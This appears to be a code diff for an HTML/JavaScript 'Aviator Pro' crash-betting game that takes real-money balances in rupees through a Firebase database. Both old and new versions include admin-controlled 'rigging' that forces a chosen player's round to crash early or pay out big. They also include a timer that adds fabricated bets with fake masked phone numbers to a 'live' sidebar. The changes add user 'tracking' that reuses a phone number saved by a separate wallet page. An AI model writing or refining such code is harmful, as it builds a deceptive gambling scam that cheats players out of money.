@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Pro - Enterprise Control</title>
+    <title>Aviator Pro - Direct Access</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { --bg: #000; --panel: #1b1c21; --accent: #e11d48; --gold: #facc15; --win: #22c55e; }
@@ -26,12 +26,13 @@
         
         /* Layout */
         .game-main { flex: 1; display: flex; overflow: hidden; }
-        .sidebar-bets { width: 120px; background: #0a0a0a; border-right: 1px solid #222; display: flex; flex-direction: column; font-size: 10px; padding: 5px; }
-        .bet-row { display: flex; justify-content: space-between; padding: 4px; border-bottom: 1px solid #1a1a1a; color: #888; }
+        .sidebar-bets { width: 130px; background: #0a0a0a; border-right: 1px solid #222; display: flex; flex-direction: column; font-size: 10px; padding: 5px; overflow-y: hidden; }
+        .bet-row { display: flex; justify-content: space-between; padding: 6px 4px; border-bottom: 1px solid #1a1a1a; color: #888; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
         .stage-area { flex: 1; position: relative; background: radial-gradient(circle at bottom left, #1e0a0a, #000); margin: 10px; border-radius: 12px; overflow: hidden; border: 1px solid #222; }
         #timerBox { position: absolute; top: 15px; right: 15px; background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 20px; border: 1px solid var(--accent); font-weight: bold; font-size: 11px; color: var(--accent); z-index: 200; }
-        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 60px; font-weight: 900; z-index: 100; transition: color 0.3s; }
+        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 60px; font-weight: 900; z-index: 100; text-shadow: 0 0 20px rgba(0,0,0,0.5); }
         
         #planeWrapper { position: absolute; bottom: 30px; left: 30px; width: 70px; z-index: 50; transition: transform 0.1s linear; }
         #planeImg { width: 100%; filter: drop-shadow(0 0 15px var(--accent)); }
@@ -53,29 +54,28 @@
 
     <div id="authOverlay">
         <div class="auth-card">
-            <h2 style="color:var(--accent); margin-bottom: 5px;">WALLET LINK</h2>
-            <p style="font-size: 10px; color: #888;">Enter registered mobile number</p>
-            <input type="number" id="userPhone" placeholder="Mobile Number">
-            <button onclick="linkWallet()" style="width:100%; padding:15px; background:var(--accent); color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">LINK ACCOUNT</button>
-            <p id="cooldownText" style="color:#ff4d4d; font-size:11px; display:none; margin-top:10px; background:rgba(255,0,0,0.1); padding:5px;">SECURITY: Device Locked for 3 Days</p>
+            <h2 style="color:var(--accent); margin-bottom: 5px;">ACCOUNT SYNC</h2>
+            <input type="number" id="userPhone" placeholder="Enter Mobile Number">
+            <button onclick="linkWallet()" style="width:100%; padding:15px; background:var(--accent); color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">LINK WALLET</button>
+            <p id="cooldownText" style="color:#ff4d4d; font-size:11px; display:none; margin-top:10px;">Security Lock: 3 Days Remaining</p>
         </div>
     </div>
 
     <div id="gameContainer">
         <div class="top-nav">
-            <span style="color:var(--accent); font-weight:900; font-style: italic;">AVIATOR PRO</span>
-            <div style="background:#000; padding:5px 15px; border-radius:20px; border:1px solid #333; font-weight:bold;">
-                <i class="fas fa-wallet" style="color:var(--win); margin-right:5px;"></i>₹<span id="balanceDisp">0.00</span>
+            <span style="color:var(--accent); font-weight:900;">AVIATOR <small style="font-size: 8px;">PRO</small></span>
+            <div style="background:#000; padding:5px 15px; border-radius:20px; border:1px solid #333;">
+                <i class="fas fa-wallet" style="color:var(--win); font-size:12px;"></i> ₹<span id="balanceDisp">0.00</span>
             </div>
-            <i class="fas fa-sign-out-alt" style="color:#444" onclick="unlink()"></i>
+            <i class="fas fa-sign-out-alt" onclick="unlink()" style="color:#444"></i>
         </div>
 
         <div class="game-main">
             <div class="sidebar-bets" id="sideBets">
-                <div style="color:var(--gold); font-weight:bold; margin-bottom:5px; border-bottom:1px solid #333;">LIVE USER</div>
-                </div>
+                <div style="color:#555; font-weight:bold; font-size:9px; margin-bottom:5px;">ALL BETS</div>
+            </div>
             <div class="stage-area">
-                <div id="timerBox">INITIALIZING...</div>
+                <div id="timerBox">CONNECTING...</div>
                 <div id="multiplier">1.00x</div>
                 <div id="planeWrapper"><img src="https://static.vecteezy.com/system/resources/previews/012/000/658/original/airplane-aircraft-flat-design-free-png.png" id="planeImg"></div>
             </div>
@@ -83,15 +83,15 @@
 
         <div class="control-board">
             <div class="bet-box">
-                <div style="display:flex; gap:10px; align-items:center; margin-bottom:10px;">
-                    <i class="fas fa-minus-circle" onclick="changeAmt(-10)"></i>
-                    <input type="number" id="betAmt" value="10" readonly style="background:none; border:none; color:white; width:50px; text-align:center; font-weight:bold; font-size:16px;">
-                    <i class="fas fa-plus-circle" onclick="changeAmt(10)"></i>
+                <div style="display:flex; gap:10px; align-items:center; margin-bottom:8px;">
+                    <button onclick="changeAmt(-10)" style="background:#222; border:none; color:white; border-radius:5px; width:25px;">-</button>
+                    <input type="number" id="betAmt" value="10" readonly style="background:none; border:none; color:white; width:45px; text-align:center; font-weight:bold;">
+                    <button onclick="changeAmt(10)" style="background:#222; border:none; color:white; border-radius:5px; width:25px;">+</button>
                 </div>
                 <button id="mainActionBtn" class="main-btn btn-bet" onclick="handleAction()">BET</button>
             </div>
             <div class="bet-box" style="justify-content:center;">
-                <span id="nextMatchMsg" style="font-size: 10px; color: #666; text-align:center;">READY TO FLY</span>
+                <span id="statusMsg" style="font-size: 10px; color: #444; text-align:center;">WAITING FOR NEXT ROUND</span>
             </div>
         </div>
     </div>
@@ -109,25 +109,24 @@
     const deviceId = localStorage.getItem('avi_dev_id') || "DV_"+Math.random().toString(36).slice(2, 11);
     localStorage.setItem('avi_dev_id', deviceId);
 
-    // 1. AUTO-LOGIN CHECK
-    async function checkExistingWallet() {
-        const savedPh = localStorage.getItem('avi_ph');
-        if(savedPh) {
-            currentPhone = savedPh;
-            // Check if still allowed on this device
-            const snap = await get(ref(db, `users/${currentPhone}`));
-            if(snap.exists() && snap.val().lastDeviceId === deviceId) {
-                startSync();
-            } else {
-                localStorage.removeItem('avi_ph'); // Force re-link if device changed
-                showAuth();
+    // --- TRACKING SYSTEM: DIRECT BRIDGE ---
+    async function checkDirectAccess() {
+        // Check local storage for phone (from this game or wallet.html)
+        const savedPh = localStorage.getItem('avi_ph') || localStorage.getItem('user_phone');
+        
+        if (savedPh) {
+            const snap = await get(ref(db, `users/${savedPh}`));
+            if (snap.exists()) {
+                const user = snap.val();
+                // If same device, let them in immediately
+                if (user.lastDeviceId === deviceId) {
+                    currentPhone = savedPh;
+                    startSync();
+                    return;
+                }
             }
-        } else {
-            showAuth();
         }
-    }
-
-    function showAuth() {
+        // If no saved phone or different device, show login
         document.getElementById('authOverlay').style.display = 'flex';
         document.getElementById('gameContainer').style.opacity = '1';
     }
@@ -137,13 +136,12 @@
         if(ph.length < 10) return;
 
         const snap = await get(ref(db, `users/${ph}`));
-        if(!snap.exists()) return alert("Number not found in registration!");
-        
+        if(!snap.exists()) return alert("Mobile number not registered!");
+
         const user = snap.val();
-        // 3-Day Multi-Device Lock
         if(user.lastDeviceId && user.lastDeviceId !== deviceId) {
-            const diff = Date.now() - (user.unlinkTime || 0);
-            if(diff < 3 * 24 * 60 * 60 * 1000) {
+            const timePassed = Date.now() - (user.unlinkTime || 0);
+            if(timePassed < 3 * 24 * 60 * 60 * 1000) {
                 document.getElementById('cooldownText').style.display = "block";
                 return;
             }
@@ -151,7 +149,6 @@
 
         await update(ref(db, `users/${ph}`), { 
             lastDeviceId: deviceId, 
-            status: "online",
             lastLogin: serverTimestamp() 
         });
 
@@ -164,17 +161,17 @@
         document.getElementById('authOverlay').style.display = 'none';
         document.getElementById('gameContainer').style.opacity = '1';
 
-        // Listen to User Data (Balance + Rigging)
+        // Tracking User Stats for Admin
         onValue(ref(db, `users/${currentPhone}`), (s) => {
             if(s.exists()){
-                const data = s.val();
-                userBalance = data.balance;
-                userRigging = data.rigging || "none"; // Admin can set to "win" or "loss"
+                const d = s.val();
+                userBalance = d.balance;
+                userRigging = d.rigging || "none";
                 document.getElementById('balanceDisp').innerText = userBalance.toFixed(2);
             }
         });
 
-        // 24-HOUR GLOBAL ENGINE SYNC
+        // 24H Global Engine Sync
         onValue(ref(db, 'aviator_sync'), (snap) => {
             const data = snap.val();
             if(!data) return;
@@ -182,31 +179,28 @@
             const elapsed = (now - data.startTime) / 1000;
             let crashPoint = data.crashAt || 2.0;
 
-            // RIGGING LOGIC
-            if(userRigging === "loss") crashPoint = 1.01; // Force Loss
-            if(userRigging === "win" && isBetPlaced) crashPoint = 10.0; // Force Win
+            // Rigging Force
+            if(userRigging === "loss") crashPoint = 1.10;
+            if(userRigging === "win" && isBetPlaced) crashPoint = 15.0;
 
-            if(elapsed < 10) {
-                updateUI("betting", 10 - elapsed);
-            } else if (elapsed < 50) {
+            if(elapsed < 10) updateUI("betting", 10 - elapsed);
+            else if (elapsed < 55) {
                 const flyTime = elapsed - 10;
                 const currentMult = Math.pow(1.072, flyTime);
                 if(currentMult >= crashPoint) updateUI("crashed", 0);
                 else updateUI("flying", flyTime, currentMult);
-            } else {
-                updateUI("crashed", 0);
-            }
+            } else updateUI("crashed", 0);
         });
 
-        // SIDEBAR FAKE BETS SYNC
+        // Fake Active User Bets
         setInterval(() => {
             const side = document.getElementById('sideBets');
-            if(side.children.length > 15) side.removeChild(side.lastChild);
             const row = document.createElement('div');
             row.className = "bet-row";
-            row.innerHTML = `<span>98***${Math.floor(Math.random()*90)}</span><span style="color:var(--gold)">₹${(Math.random()*500).toFixed(0)}</span>`;
-            side.insertBefore(row, side.firstChild.nextSibling);
-        }, 3000);
+            row.innerHTML = `<span>9${Math.floor(Math.random()*9)}***${Math.floor(Math.random()*99)}</span><span style="color:var(--win)">₹${(Math.random()*200).toFixed(0)}</span>`;
+            side.prepend(row);
+            if(side.children.length > 20) side.lastElementChild.remove();
+        }, 2500);
     }
 
     function updateUI(phase, time, mult = 1.0) {
@@ -222,14 +216,19 @@
             multTxt.style.color = "white";
             plane.classList.remove('flew-away');
             plane.style.transform = `translate(0,0)`;
-            document.getElementById('timerBox').innerText = `NEXT ROUND: ${Math.ceil(time)}s`;
-            document.getElementById('nextMatchMsg').innerText = "READY TO FLY";
-            if(!isBetPlaced) { btn.className = "main-btn btn-bet"; btn.innerText = "BET"; btn.disabled = false; }
+            document.getElementById('timerBox').innerText = `STARTING IN ${Math.ceil(time)}s`;
+            document.getElementById('statusMsg').innerText = "WAITING FOR NEXT ROUND";
+            if(!isBetPlaced) { 
+                btn.className = "main-btn btn-bet"; 
+                btn.innerText = "BET"; 
+                btn.disabled = false; 
+            }
         } 
         else if (phase === "flying") {
             multTxt.innerText = mult.toFixed(2) + "x";
+            multTxt.style.color = mult > 2 ? "#913dff" : "white";
             document.getElementById('timerBox').innerText = `FLYING`;
-            plane.style.transform = `translate(${time * 20}px, -${Math.pow(time, 1.3) * 2}px)`;
+            plane.style.transform = `translate(${time * 18}px, -${Math.pow(time, 1.3) * 1.8}px)`;
             if(isBetPlaced && !hasCashedOut) {
                 btn.className = "main-btn btn-cashout";
                 btn.innerText = `CASHOUT ₹${(activeBetAmt * mult).toFixed(2)}`;
@@ -243,7 +242,8 @@
             if(isBetPlaced && !hasCashedOut) {
                 showPopup("loss");
                 isBetPlaced = false;
-                btn.className = "main-btn btn-waiting"; btn.innerText = "LOST";
+                btn.className = "main-btn btn-waiting"; 
+                btn.innerText = "FLEW AWAY";
             }
             isBetPlaced = false;
         }
@@ -254,18 +254,17 @@
             const amt = parseFloat(document.getElementById('betAmt').value);
             if(amt > userBalance) return alert("Insufficient Balance");
             
-            // Deduct & Track
             await update(ref(db, `users/${currentPhone}`), { 
                 balance: increment(-amt),
                 lastBet: amt,
-                totalBets: increment(1)
+                status: "betting"
             });
             
             isBetPlaced = true; 
             activeBetAmt = amt;
-            document.getElementById('mainActionBtn').innerText = "WAITING...";
+            document.getElementById('mainActionBtn').innerText = "WAIT FOR NEXT";
             document.getElementById('mainActionBtn').className = "main-btn btn-waiting";
-            document.getElementById('nextMatchMsg').innerText = "BET PLACED - WAIT";
+            document.getElementById('statusMsg').innerText = "BET ACCEPTED";
         } 
         else if (gamePhase === "flying" && isBetPlaced && !hasCashedOut) {
             const currentMult = parseFloat(document.getElementById('multiplier').innerText);
@@ -273,7 +272,10 @@
             hasCashedOut = true; 
             isBetPlaced = false;
             
-            await update(ref(db, `users/${currentPhone}`), { balance: increment(win) });
+            await update(ref(db, `users/${currentPhone}`), { 
+                balance: increment(win),
+                status: "won"
+            });
             showPopup("win", win);
             document.getElementById('mainActionBtn').innerText = `WON ₹${win.toFixed(2)}`;
             document.getElementById('mainActionBtn').className = "main-btn btn-waiting";
@@ -287,7 +289,7 @@
         } else {
             document.getElementById('lossPopup').classList.add('show-popup');
         }
-        setTimeout(hidePopups, 2000);
+        setTimeout(hidePopups, 2500);
     }
 
     function hidePopups() {
@@ -295,20 +297,20 @@
         document.getElementById('lossPopup').classList.remove('show-popup');
     }
 
+    window.changeAmt = (v) => {
+        let cur = parseInt(document.getElementById('betAmt').value);
+        if(cur + v >= 10) document.getElementById('betAmt').value = cur + v;
+    };
+
     window.unlink = async () => {
-        if(confirm("Unlink Wallet? (3-Day lock applies)")) {
+        if(confirm("Unlink device? 3-day restriction will apply.")) {
             await update(ref(db, `users/${currentPhone}`), { unlinkTime: Date.now() });
             localStorage.clear();
             location.reload();
         }
     };
 
-    window.changeAmt = (v) => {
-        let cur = parseInt(document.getElementById('betAmt').value);
-        if(cur + v >= 10) document.getElementById('betAmt').value = cur + v;
-    };
-
-    checkExistingWallet();
+    checkDirectAccess();
 </script>
 </body>
 </html>
